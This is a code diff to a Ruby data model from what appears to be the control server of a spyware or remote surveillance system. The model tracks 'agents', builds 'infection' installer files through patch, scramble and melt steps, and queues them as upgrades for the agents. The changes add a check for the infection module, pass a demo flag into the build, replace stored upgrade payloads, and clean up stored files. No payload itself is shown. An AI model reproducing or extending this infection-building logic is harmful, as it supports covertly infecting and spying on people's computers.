@@ -36,7 +36,7 @@ class Item
   field :version, type: Integer
   field :type, type: String
   field :platform, type: String
-  field :deleted, type: Boolean
+  field :deleted, type: Boolean, default: false
   field :uninstalled, type: Boolean
   field :demo, type: Boolean
   field :upgradable, type: Boolean
@@ -172,6 +172,23 @@ class Item
   def add_infection_files
     config = JSON.parse(self.configs.last.config)
 
+    found = false
+
+    # build the infection files only if at least one subaction is dealing with the infection module
+    config['actions'].each do |action|
+      action['subactions'].each do |sub|
+        if sub['action'] == 'module' and sub['module'] == 'infection'
+          found = true
+        end
+      end
+    end
+
+    if found
+      trace :info, "Infection module for agent #{self.name} detected, building files..."
+    else
+      return
+    end
+
     config['modules'].each do |mod|
       if mod['module'] == 'infection'
 
@@ -182,7 +199,7 @@ class Item
           build.unpack
           build.patch({'demo' => self.demo})
           build.scramble
-          build.melt({'admin' => false})
+          build.melt({'admin' => false, 'demo' => self.demo})
           add_upgrade('installer', File.join(build.tmpdir, 'output'))
           build.clean
         end
@@ -194,11 +211,12 @@ class Item
           build.unpack
           build.patch({'demo' => self.demo})
           build.scramble
-          build.melt({'admin' => false})
+          build.melt({'admin' => false, 'demo' => self.demo})
           add_upgrade('wmcore.001', File.join(build.tmpdir, 'firstsage'))
           add_upgrade('wmcore.002', File.join(build.tmpdir, 'zoo'))
           build.clean
         end
+
       end
     end
 
@@ -226,7 +244,12 @@ class Item
   end
 
   def add_upgrade(name, file)
-    content = File.binread(file)
+    # make sure to overwrite the new upgrade
+    self.upgrade_requests.destroy_all(conditions: { filename: name })
+
+    content = File.open(file, 'rb+') {|f| f.read}
+    raise "Cannot read from file #{file}" if content.nil?
+
     self.upgrade_requests.create!({filename: name, _grid: [RCS::DB::GridFS.put(content, {filename: name})] })
   end
 
@@ -274,8 +297,6 @@ class Item
     # special request for windows to have the c: drive
     self.filesystem_requests.create!({path: '%HOMEDRIVE%\\\\*', depth: 1}) if self.platform == 'windows'
   end
-
-  protected
 
   def create_callback
     case self._kind
@@ -335,7 +356,6 @@ class Item
     self.cs = calculate_checksum
   end
 
-  public 
   def calculate_checksum
     # take the fields that are relevant and calculate the checksum on it
     hash = [self._id, self.name, self.counter, self.status, self._kind, self.path]
@@ -379,6 +399,14 @@ class UpgradeRequest
   validates_uniqueness_of :filename
 
   embedded_in :item
+
+  after_destroy :destroy_upgrade_callback
+
+  def destroy_upgrade_callback
+    # remove the content from the grid
+    RCS::DB::GridFS.delete self[:_grid].first
+  end
+
 end
 
 class UploadRequest
@@ -390,6 +418,13 @@ class UploadRequest
   validates_uniqueness_of :filename
   
   embedded_in :item
+
+  after_destroy :destroy_upload_callback
+
+  def destroy_upload_callback
+    # remove the content from the grid
+    RCS::DB::GridFS.delete self[:_grid].first
+  end
 end
 
 class Stat
